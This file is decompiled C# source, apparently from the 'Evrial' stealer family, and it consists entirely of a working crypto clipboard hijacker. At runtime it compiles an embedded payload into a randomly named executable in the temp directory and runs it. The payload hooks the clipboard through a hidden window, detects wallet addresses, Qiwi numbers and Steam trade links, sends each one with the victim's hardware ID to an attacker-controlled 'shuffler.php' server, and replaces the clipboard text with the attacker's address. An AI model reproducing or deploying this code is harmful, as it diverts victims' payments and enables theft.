using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using Microsoft.CSharp;

namespace Evrial
{
	// Token: 0x02000005 RID: 5
	internal static class Module
	{
		// Token: 0x06000013 RID: 19 RVA: 0x00002404 File Offset: 0x00000604
		public static void ClipperThread()
		{
			string text = string.Concat(new string[]
			{
				"using System;\r\nusing System.Net;\r\nusing System.Runtime.InteropServices;\r\nusing System.Threading;\r\nusing System.Windows.Forms;\r\n\r\ninternal class Program\r\n{\r\n    public delegate void OnClipboardChangeEventHandler(ClipboardFormat format, object data);\r\n\r\n    public enum ClipboardFormat : byte\r\n    {\r\n        Text\r\n    }\r\n\r\n    private static string text = \"\";\r\n\r\n    private static void Main(string[] args)\r\n    {\r\n        RawSettings.Owner = \"",
				RawSettings.Owner,
				"\";\r\n        RawSettings.Version = \"",
				RawSettings.Version,
				"\";\r\n        RawSettings.HWID = \"",
				RawSettings.HWID,
				"\";\r\n\r\n        OnClipboardChange += ClipboardMonitor_OnClipboardChange;\r\n        Start();\r\n    }\r\n\r\n    public static void ClipboardMonitor_OnClipboardChange(ClipboardFormat format, object data)\r\n    {\r\n        try\r\n        {\r\n            if (format != ClipboardFormat.Text) return;\r\n            string copied = Clipboard.GetText();\r\n            if (copied == text) return;\r\n            CoinType? coinType = GetType(copied);\r\n            if (coinType == null) return;\r\n            GetClipboardText(coinType, copied);\r\n        }\r\n        catch (Exception ex)\r\n        {\r\n            Console.WriteLine(ex.ToString());\r\n        }\r\n    }\r\n\r\n    private static CoinType? GetType(string cliptext)\r\n    {\r\n        try\r\n        {\r\n            if (cliptext.StartsWith(\"1\") && !cliptext.Contains(\"0\") && !cliptext.Contains(\"I\") &&\r\n                !cliptext.Contains(\"l\") && !cliptext.Contains(\"O\") && cliptext.Length == 34)\r\n                return CoinType.BTC;\r\n\r\n            if (cliptext.StartsWith(\"L\") && !cliptext.Contains(\"0\") && !cliptext.Contains(\"I\") &&\r\n                !cliptext.Contains(\"l\") && !cliptext.Contains(\"O\") && cliptext.Length == 34)\r\n                return CoinType.LTC;\r\n\r\n            if (cliptext.StartsWith(\"0x\") && cliptext.Length == 42)\r\n                return CoinType.ETH;\r\n\r\n            if (cliptext.StartsWith(\"Z\") && cliptext.Length == 13)\r\n                return CoinType.WMZ;\r\n\r\n            if (cliptext.StartsWith(\"+\") && cliptext.Length == 12)\r\n                return CoinType.Qiwi;\r\n\r\n            if (cliptext.StartsWith(\"79\") && cliptext.Length == 11)\r\n                return CoinType.Qiwi;\r\n\r\n            if (cliptext.StartsWith(\"380\") && cliptext.Length == 12)\r\n                return CoinType.Qiwi;\r\n\r\n            if (cliptext.StartsWith(\"4\") && (cliptext.Length == 95 || cliptext.Length == 106))\r\n                return CoinType.XMR;\r\n\r\n            if (cliptext.StartsWith(\"https://steamcommunity.com/tradeoffer/new/\"))\r\n                return CoinType.Steam;\r\n\r\n            if (cliptext.StartsWith(\"R\") && cliptext.Length == 13)\r\n                return CoinType.WMR;\r\n\r\n            if (cliptext.StartsWith(\"E\") && cliptext.Length == 13)\r\n                return CoinType.WME;\r\n\r\n            if (cliptext.StartsWith(\"+380\") && cliptext.Length == 13)\r\n                return CoinType.Qiwi;\r\n\r\n            return null;\r\n        }\r\n        catch (Exception ex)\r\n        {\r\n            Console.WriteLine(ex.ToString());\r\n            return null;\r\n        }\r\n    }\r\n\r\n    private static void GetClipboardText(CoinType? coinType, string copied)\r\n    {\r\n        try\r\n        {\r\n            string resp =\r\n                new WebClient().DownloadString(RawSettings.SiteUrl + \"shuffler.php?type=\" + coinType + \"&user=\" + RawSettings.Owner + \"&copy=\" + copied + \"&hwid=\" + RawSettings.HWID)\r\n                    .Normalize().Replace(\" \", string.Empty).Replace(\"\\n\", \"\").Replace(\"\\r\\n\", \"\");\r\n            Console.WriteLine(resp);\r\n            text = resp;\r\n            if (resp == \"\" || resp == \" \") return;\r\n            Clipboard.SetText(resp);\r\n        }\r\n        catch (Exception ex)\r\n        {\r\n            Console.WriteLine(ex.ToString());\r\n        }\r\n    }\r\n\r\n    public static event OnClipboardChangeEventHandler OnClipboardChange;\r\n\r\n    public static void Start()\r\n    {\r\n        ClipboardWatcher.Start();\r\n        ClipboardWatcher.OnClipboardChange += (format, data) => { OnClipboardChange.Invoke(format, data); };\r\n    }\r\n\r\n    internal static class RawSettings\r\n    {\r\n        public static string Owner;\r\n        public static string Version;\r\n        public static string SiteUrl = \"",
				RawSettings.SiteUrl,
				"\";\r\n        public static string HWID;\r\n    }\r\n\r\n    internal enum CoinType\r\n    {\r\n        BTC,\r\n        LTC,\r\n        ETH,\r\n        XMR,\r\n        Qiwi,\r\n        WMR,\r\n        WMZ,\r\n        WME,\r\n        Steam\r\n    }\r\n\r\n    private class ClipboardWatcher : Form\r\n    {\r\n        public delegate void OnClipboardChangeEventHandler(ClipboardFormat format, object data);\r\n\r\n        private const int WM_DRAWCLIPBOARD = 0x308;\r\n        private const int WM_CHANGECBCHAIN = 0x030D;\r\n        private static ClipboardWatcher mInstance;\r\n        private static IntPtr nextClipboardViewer;\r\n        private static readonly string[] formats = Enum.GetNames(typeof(ClipboardFormat));\r\n        public static event OnClipboardChangeEventHandler OnClipboardChange;\r\n\r\n        public static void Start()\r\n        {\r\n            if (mInstance != null)\r\n                return;\r\n\r\n            Thread t = new Thread(x => Application.Run(new ClipboardWatcher()));\r\n            t.SetApartmentState(ApartmentState.STA); // give the [STAThread] attribute\r\n            t.Start();\r\n        }\r\n\r\n        protected override void SetVisibleCore(bool value)\r\n        {\r\n            CreateHandle();\r\n\r\n            mInstance = this;\r\n\r\n            nextClipboardViewer = SetClipboardViewer(mInstance.Handle);\r\n\r\n            base.SetVisibleCore(false);\r\n        }\r\n\r\n        [DllImport(\"User32.dll\", CharSet = CharSet.Auto)]\r\n        private static extern IntPtr SetClipboardViewer(IntPtr hWndNewViewer);\r\n\r\n        [DllImport(\"user32.dll\", CharSet = CharSet.Auto)]\r\n        private static extern int SendMessage(IntPtr hwnd, int wMsg, IntPtr wParam, IntPtr lParam);\r\n\r\n        protected override void WndProc(ref Message m)\r\n        {\r\n            switch (m.Msg)\r\n            {\r\n                case WM_DRAWCLIPBOARD:\r\n                    ClipChanged();\r\n                    SendMessage(nextClipboardViewer, m.Msg, m.WParam, m.LParam);\r\n                    break;\r\n\r\n                case WM_CHANGECBCHAIN:\r\n                    if (m.WParam == nextClipboardViewer)\r\n                        nextClipboardViewer = m.LParam;\r\n                    else\r\n                        SendMessage(nextClipboardViewer, m.Msg, m.WParam, m.LParam);\r\n                    break;\r\n\r\n                default:\r\n\r\n                    base.WndProc(ref m);\r\n                    break;\r\n            }\r\n        }\r\n\r\n        private static void ClipChanged()\r\n        {\r\n            try\r\n            {\r\n                IDataObject iData = Clipboard.GetDataObject();\r\n\r\n                ClipboardFormat? format = null;\r\n\r\n                foreach (string f in formats)\r\n                    if (iData.GetDataPresent(f))\r\n                    {\r\n                        format = (ClipboardFormat)Enum.Parse(typeof(ClipboardFormat), f);\r\n                        break;\r\n                    }\r\n\r\n                object data = iData.GetData(format.ToString());\r\n\r\n                if (data == null || format == null)\r\n                    return;\r\n\r\n                OnClipboardChange.Invoke((ClipboardFormat)format, data);\r\n            }\r\n            catch\r\n            {\r\n            }\r\n        }\r\n    }\r\n}"
			});
			string text2 = Path.GetTempPath() + "\\nATNNhZ.exe";
			Dictionary<string, string> providerOptions = new Dictionary<string, string>
			{
				{
					"CompilerVersion",
					"v4.0"
				}
			};
			CSharpCodeProvider csharpCodeProvider = new CSharpCodeProvider(providerOptions);
			CompilerParameters compilerParameters = new CompilerParameters
			{
				CompilerOptions = "/t:winexe",
				OutputAssembly = text2,
				GenerateExecutable = true
			};
			compilerParameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
			compilerParameters.ReferencedAssemblies.Add("System.dll");
			csharpCodeProvider.CompileAssemblyFromSource(compilerParameters, new string[]
			{
				text
			});
			Process.Start(text2);
		}
	}
}
